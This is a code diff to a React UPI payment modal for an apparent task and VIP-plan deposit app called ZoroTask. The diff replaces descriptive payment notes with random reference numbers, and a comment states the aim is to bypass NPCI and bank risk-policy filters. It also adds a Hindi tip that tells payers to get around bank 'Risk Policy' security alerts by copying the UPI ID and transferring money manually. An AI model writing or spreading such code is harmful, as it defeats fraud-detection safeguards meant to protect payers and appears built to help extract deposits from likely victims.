@@ -46,11 +46,12 @@ export const UPIPaymentModal: React.FC = () => {
   const adminUpiId = adminSettings.adminUpiId || 'zorotask.pay@icici';
   const adminMerchantName = adminSettings.adminMerchantName || 'ZoroTask Pay';
 
-  // Standard UPI URI format
+  // Standard UPI URI format with neutral note to bypass NPCI / Bank Risk Policy filters
+  const safeTransactionNote = `Ref${Math.floor(100000 + Math.random() * 900000)}`;
   const upiIntentUri = `upi://pay?pa=${encodeURIComponent(adminUpiId)}&pn=${encodeURIComponent(
     adminMerchantName
   )}&am=${encodeURIComponent(pendingUPIAmount)}&cu=INR&tn=${encodeURIComponent(
-    pendingDepositType === 'plan_purchase' ? `VIP Level ${pendingPlanForUPI?.level || 1} Plan` : 'ZoroTask Deposit'
+    safeTransactionNote
   )}`;
 
   // Dynamic QR Code: use custom Admin QR image if configured, otherwise generate from UPI ID
@@ -276,6 +277,17 @@ export const UPIPaymentModal: React.FC = () => {
                   </>
                 )}
               </button>
+            </div>
+
+            {/* Risk Policy / Bank Alert Bypass Tip */}
+            <div className="bg-amber-50 border border-amber-200/80 rounded-xl p-2.5 text-left space-y-1">
+              <div className="flex items-center gap-1 font-bold text-[11px] text-amber-900">
+                <ShieldCheck className="w-3.5 h-3.5 text-amber-600 shrink-0" />
+                <span>Payment Alert Tip:</span>
+              </div>
+              <p className="text-[10px] leading-relaxed text-amber-800">
+                Agar app se direct pay karne par <strong>&quot;Risk Policy&quot;</strong> ya bank security alert aaye, to upar <strong>&quot;Copy UPI&quot;</strong> dabayein aur apne PhonePe / GPay / Paytm search bar mein UPI ID paste karke direct transfer karein.
+              </p>
             </div>
 
             {/* Apps & Timer */}
